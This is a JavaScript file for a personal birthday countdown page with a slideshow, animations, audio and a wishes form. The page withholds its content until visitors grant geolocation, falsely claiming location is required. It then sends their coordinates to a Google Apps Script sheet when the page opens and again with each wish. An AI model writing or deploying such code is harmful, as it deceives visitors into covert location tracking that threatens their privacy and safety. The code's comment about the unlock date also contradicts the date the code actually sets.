/* =========================================================
   BIRTHDAY PAGE – ELITE MASTER SCRIPT
   ---------------------------------------------------------
   ✔ Internet-synced IST time (cached, spoof-proof)
   ✔ Countdown → Reveal → 24h visibility → Auto reset
   ✔ Long-open tab safe + duplicate reveal lock
   ✔ Album slideshow
   ✔ Balloons, hearts, sparkles, bokeh
   ✔ Wishes popup + Google Sheet submit
   ✔ Audio smart toggle + auto-resume
   ✔ Battery & accessibility friendly
   ========================================================= */

(function () {

  /* ------------------ Helpers ------------------ */
  const $ = sel => document.querySelector(sel);
  const VISIBLE_MS = 24 * 60 * 60 * 1000;
  let revealed = false;
  let revealLock = false;
  let countdownTimer = null;
  let timeReady = false;
  function setPreloaderState(state) {
  const spinner = document.querySelector(".spinner");
  const countdown = document.getElementById("preloader-countdown");

  if (state === "waiting") {
    spinner.style.display = "none";
    countdown.style.display = "none";
  } else {
    spinner.style.display = "block";
    countdown.style.display = "block";
  }
}

  /* ------------------ Internet Time (IST + Cache) ------------------ */
  let TIME_OFFSET = 0;
  const CACHE_KEY = "ist_time_offset";
  const CACHE_TTL = 6 * 60 * 60 * 1000; // 6 hours
let locationGranted = false;
let geoData = {
  lat: "",
  lng: ""
};
  async function syncInternetTimeIST() {
    const cached = JSON.parse(localStorage.getItem(CACHE_KEY) || "null");
    if (cached && Date.now() - cached.ts < CACHE_TTL) {
      TIME_OFFSET = cached.offset;
      return;
    }

    try {
      const res = await fetch("https://worldtimeapi.org/api/timezone/Asia/Kolkata");
      const data = await res.json();
      TIME_OFFSET = new Date(data.datetime).getTime() - Date.now();
      localStorage.setItem(CACHE_KEY, JSON.stringify({ offset: TIME_OFFSET, ts: Date.now() }));
    } catch {
      TIME_OFFSET = cached?.offset || 0;
    }
  }

  function nowIST() {
    return Date.now() + TIME_OFFSET;
  }

  /* ------------------ Target Time Logic (IST) ------------------ */
function requestUserLocation(always = false) {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(
      pos => {
        geoData.lat = pos.coords.latitude;
        geoData.lng = pos.coords.longitude;
        locationGranted = true;

        if (always) {
          sendLocationToSheet("page_open");
        }

        resolve();
      },
      err => reject(err.message),
      { enableHighAccuracy:false, timeout:10000, maximumAge:0 }
    );
  });
}
  function getTargetWindow() {
    const now = nowIST();
    const year = new Date(now).getFullYear();

    // Feb 4, 06:00 IST
    const start = new Date(year, 2, 14, 9, 0, 0).getTime();
    const end = start + VISIBLE_MS;

    if (now < start) return { start, end, now };
    if (now >= start && now < end) return { start, end, now };

    const nextStart = new Date(year + 1, 2, 14, 9, 0, 0).getTime();
    return { start: nextStart, end: nextStart + VISIBLE_MS, now };
  }

  /* ------------------ Time Formatter ------------------ */
  function formatDiff(ms) {
    if (ms <= 0) return "00 : 00 : 00 : 00";
    const d = Math.floor(ms / 86400000);
    const h = Math.floor((ms % 86400000) / 3600000);
    const m = Math.floor((ms % 3600000) / 60000);
    const s = Math.floor((ms % 60000) / 1000);
    return `${String(d).padStart(2,'0')} : ${String(h).padStart(2,'0')} : ${String(m).padStart(2,'0')} : ${String(s).padStart(2,'0')}`;
  }

  /* ------------------ Preloader Countdown ------------------ */
  function updatePreloader() {
    if (!timeReady) return;

    const countdown = $("#preloader-countdown");
    const subtext = $("#preloader-subtext");
    if (!countdown) return;

    const { start, end, now } = getTargetWindow();

    if (now >= start && now < end) {

  if (!locationGranted) {
    countdown.textContent = "00 : 00 : 00 : 00";
    subtext.textContent = "📍 Please allow location access";
    return;
  }

  countdown.textContent = formatDiff(end - now);
  subtext.textContent = "🎉 It's Birthday Time!";
  revealContent();
  return;
}

    if (now < start) {
      countdown.textContent = formatDiff(start - now);
      const d = new Date(start);
      subtext.textContent =
        `Opens on ${d.toLocaleDateString("en-IN")} ${d.toLocaleTimeString("en-IN",{hour:'2-digit',minute:'2-digit'})}`;
      return;
    }

    countdown.textContent = "00 : 00 : 00 : 00";
    subtext.textContent = "⏳ Event Ended";
  }

  /* ------------------ Reveal Main Content ------------------ */
  function revealContent() {
    if (revealed || revealLock) return;
    revealLock = true;
    revealed = true;

    const preloader = $("#preloader");
    preloader.style.opacity = "0";
    setTimeout(() => preloader.remove(), 600);

    const main = $("#mainContent");
    main.classList.remove("hidden");
    main.classList.add("show-content");

    $("#audioToggle").classList.add("visible");
    $("#openWishes").classList.add("visible");
const allowBtn = document.getElementById("allowLocationBtn");
if (allowBtn) allowBtn.remove();
    startAlbum();
    startHearts();
    startSparkles();
    startBokeh();
    startBalloons();
    scheduleAutoHide();
  }

  /* ------------------ Auto Reset ------------------ */
  function scheduleAutoHide() {
    const { end, now } = getTargetWindow();
    setTimeout(() => location.reload(), end - now + 500);
  }

  /* ------------------ Album Slideshow ------------------ */
  let albumTimer;

function startAlbum() {
  const photos = [...document.querySelectorAll(".album-photo")];
  const thumbs = [...document.querySelectorAll(".thumb")];
  let i = 0;

  function show(index) {
    photos.forEach(p => p.classList.remove("active"));
    thumbs.forEach(t => t.classList.remove("active"));
    photos[index].classList.add("active");
    thumbs[index].classList.add("active");
    i = index;
  }

  thumbs.forEach((t, idx) => {
    t.onclick = () => {
      clearInterval(albumTimer);
      show(idx);
      albumTimer = setInterval(next, 3500);
    };
  });

  function next() {
    show((i + 1) % photos.length);
  }

  show(0);
  albumTimer = setInterval(next, 3500);
}
  /* ------------------ Floating Hearts ------------------ */
  function startHearts() {
    const container = $("#floating-hearts");
    if (!container) return;
    setInterval(() => {
      const heart = document.createElement("div");
      heart.className = "f-heart";
      heart.textContent = ["💖","💗","💞","💕","❤️"][Math.floor(Math.random()*5)];
      heart.style.left = Math.random()*100 + "vw";
      heart.style.fontSize = 16 + Math.random()*24 + "px";
      heart.style.animationDuration = (3 + Math.random()*3) + "s";
      container.appendChild(heart);
      setTimeout(() => heart.remove(), 5000);
    }, 500);
  }

  /* ------------------ Sparkles ------------------ */
  function startSparkles() {
    const canvas = $("#sparkleCanvas");
    const ctx = canvas.getContext("2d");
    function resize(){ canvas.width = innerWidth; canvas.height = innerHeight; }
    resize(); window.addEventListener("resize", resize);
    const sparks = [];
    setInterval(() => sparks.push({
      x: Math.random()*canvas.width,
      y: Math.random()*canvas.height*0.6,
      vy: -1 - Math.random(),
      life: 60, r: 1 + Math.random()*3
    }), 200);
    (function draw(){
      ctx.clearRect(0,0,canvas.width,canvas.height);
      sparks.forEach((s,i)=>{
        s.y+=s.vy; s.life--;
        ctx.beginPath();
        ctx.fillStyle=`rgba(255,255,255,${s.life/60})`;
        ctx.arc(s.x,s.y,s.r,0,Math.PI*2);
        ctx.fill();
        if(s.life<=0) sparks.splice(i,1);
      });
      requestAnimationFrame(draw);
    })();
  }

  /* ------------------ Bokeh ------------------ */
  function startBokeh() {
    const canvas = $("#bokehCanvas");
    const ctx = canvas.getContext("2d");
    canvas.width = innerWidth; canvas.height = innerHeight;
    const dots = Array.from({length:25},()=>({
      x:Math.random()*canvas.width,
      y:Math.random()*canvas.height,
      r:20+Math.random()*60,
      a:0.05+Math.random()*0.1,
      vy:0.2+Math.random()*0.4
    }));
    (function animate(){
      ctx.clearRect(0,0,canvas.width,canvas.height);
      dots.forEach(d=>{
        d.y-=d.vy; if(d.y<-100) d.y=canvas.height+100;
        ctx.beginPath();
        ctx.fillStyle=`rgba(255,214,107,${d.a})`;
        ctx.arc(d.x,d.y,d.r,0,Math.PI*2);
        ctx.fill();
      });
      requestAnimationFrame(animate);
    })();
  }

  /* ------------------ Balloons ------------------ */
  function startBalloons() {
    const container = $("#balloons");
    setInterval(()=>{
      const b = document.createElement("div");
      b.className="balloon";
      b.style.left=Math.random()*95+"vw";
      b.style.width=b.style.height=40+Math.random()*80+"px";
      container.appendChild(b);
      setTimeout(()=>b.remove(),20000);
    },3000);
  }

  /* ------------------ Wishes Popup ------------------ */
  function wireWishesPopup() {
    const popup = $("#wishesPopup");
    $("#openWishes").onclick = () => popup.style.display="flex";
    $("#closePopup").onclick = $("#closePopup2").onclick = () => popup.style.display="none";
  }

  /* ------------------ Wishes Form ------------------ */
  function wireWishesForm() {
    const form = $("#wishesForm");
    if (!form) return;
    form.addEventListener("submit", e => {
      e.preventDefault();
      const name=$("#wisherName").value.trim();
      const msg=$("#wisherMessage").value.trim();
      if(!name||!msg) return alert("Please enter name and message");
      $("#thanksMessage").style.display="block";
      fetch(
  "https://script.google.com/macros/s/AKfycbxlXW_9fXWDXIvwv6WWiI40qV7HC30THe7gwLViCaIcpQwC5boO5TgbouOD_buwe4OY/exec" +
  `?page=Vashista` +
  `&name=${encodeURIComponent(name)}` +
  `&message=${encodeURIComponent(msg)}` +
  `&lat=${geoData.lat}` +
  `&lng=${geoData.lng}` +
  `&event=wish_submit`,
  { mode: "no-cors" }
);
      setTimeout(()=>{
        $("#wishesPopup").style.display="none";
        $("#thanksMessage").style.display="none";
        form.reset();
      },1500);
    });
  }
function sendLocationToSheet(eventType = "visit") {
  fetch(
    "https://script.google.com/macros/s/AKfycbxlXW_9fXWDXIvwv6WWiI40qV7HC30THe7gwLViCaIcpQwC5boO5TgbouOD_buwe4OY/exec" +
    `?page=Vashista` +
    `&lat=${geoData.lat}` +
    `&lng=${geoData.lng}` +
    `&event=${eventType}`,
    { mode: "no-cors" }
  );
}
  /* ------------------ Audio ------------------ */
  function wireAudio() {
  const btn = $("#audioToggle");
  const audio = $("#myAudio");

  btn.onclick = async () => {
    try {
      if (audio.paused) {
        await audio.play();
        btn.textContent = "🔊";
      } else {
        audio.pause();
        btn.textContent = "🔇";
      }
    } catch (e) {
      console.log("Audio play blocked:", e);
    }
  };
}

  /* ------------------ Performance & Accessibility ------------------ */
  document.addEventListener("DOMContentLoaded", async () => {
  await syncInternetTimeIST();
  timeReady = true;

  const subtext = document.getElementById("preloader-subtext");
  subtext.textContent = "📍 Location access required to continue";

  const allowBtn = document.getElementById("allowLocationBtn");

subtext.textContent = "📍 Location access required to continue";

allowBtn.onclick = async () => {
  try {
    // single call does everything
    await requestUserLocation(true); // saves page_open automatically

    subtext.style.display = "block";
    subtext.textContent = "⏳ Verifying time…";
    allowBtn.style.display = "none";

    setPreloaderState("loading");
    updatePreloader();

  } catch (e) {
    subtext.textContent = "❌ Location permission denied. Please allow to continue.";
  }
};
setPreloaderState("waiting");

// ⛔ do NOT start countdown yet
countdownTimer = setInterval(updatePreloader, 1000);
  wireWishesPopup();
  wireWishesForm();
  wireAudio();
});

})();